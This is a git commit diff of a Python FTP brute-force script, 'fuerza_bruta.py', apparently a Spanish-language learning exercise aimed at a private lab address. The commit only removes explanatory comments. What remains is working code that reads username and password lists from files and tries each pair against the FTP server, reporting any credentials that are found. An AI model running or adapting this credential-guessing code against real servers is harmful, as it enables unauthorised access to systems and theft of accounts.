a9c22ff128c038f1f657abc7b7153c2ea319101b
kevin19970502 <89942531+kevin19970502@users.noreply.github.com>
2024-07-12 08:31:41 -0500

    Update fuerza_bruta.py

--- fuerza_bruta.py
+++ fuerza_bruta.py
@@ -1,17 +1,17 @@
-#ver si tenemos intalado sistema ftplib
+
 import sys
 
 from ftplib import FTP
 
-# Create FTP object without passing parameters  
+
 ftp = FTP()
 
 def bruteforce(target,user,password):
-	ftp=FTP(target)#llamar a la funcion ftp y realiazr una conexion
+	ftp=FTP(target)
 	
 	try:
-		ftp.login(user,password)# realizamos la conexion
-		print('(+) Se encontro las credenciales =>{}:{}'.format(user,password))# reeamplazon las llaves con el valor de user y password que obtenemos
+		ftp.login(user,password)
+		print('(+) Se encontro las credenciales =>{}:{}'.format(user,password))
 		
 	except:
 		print('(+) Fallo las credenciales =>{}:{}'.format(user,password))
@@ -20,8 +20,8 @@ def bruteforce(target,user,password):
 
 def main():
 	target= "192.168.1.133"
-	users=open('users.txt','r')# abrimos  el archiov txt y leemos(r)
-	users=users.read().split('\n')#como el datos del arhcivo esta en una columna , el salto de linea cambiamos por el separador , se convierte fila
+	users=open('users.txt','r')
+	users=users.read().split('\n')
 	passwords=open('pass.txt','r')
 	passwords=passwords.read().split('\n')
 
